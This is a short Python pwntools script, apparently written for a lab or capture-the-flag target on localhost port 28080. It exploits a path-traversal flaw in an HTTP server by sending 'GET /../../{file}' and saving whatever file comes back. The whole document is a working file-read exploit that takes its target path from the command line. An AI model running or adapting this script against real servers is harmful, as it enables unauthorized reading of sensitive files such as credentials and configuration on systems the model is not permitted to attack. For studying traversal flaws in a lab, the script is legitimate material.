import os.path


from pwn import *
from sys import argv


def read_file(file):
    # so far as i can tell, this content length doesn't matter for our purposes
    payload = f"GET /../../{file} \r\n\r\n Content-Length: 100"

    io = tubes.remote.remote("localhost", 28080, typ="tcp")
    io.send(payload)
    response_header = io.recvuntil("\r\n")  # have to receive the "Not Implemented" response, or the program will crash with sigpipe
    if response_header != b"HTTP/1.1 200 OK\r\n":
        print("[!] HTTP request failed!")
        print(f"[!] Response header: {response_header}")
        return

    response_metadata = io.recvuntil("\r\n\r\n")
    if b"Content-Length: " not in response_metadata:
        print("[!] Response succeeded, but had no Content-Length!")
        print(f"[!] Response headers: {response_header} {response_metadata}")
        return

    file_length = int(response_metadata.split(b"Content-Length: ")[1][:-4])
    file_data = io.recv(file_length)

    out_filename = os.path.basename(file)
    with open(out_filename, "wb") as f:
        f.write(file_data)
        print(f"[+] Read file to {out_filename}")


if __name__ == "__main__":
    if len(argv) < 2:
        print("[!] Must provide a file to read!")
    else:
        read_file(argv[1])
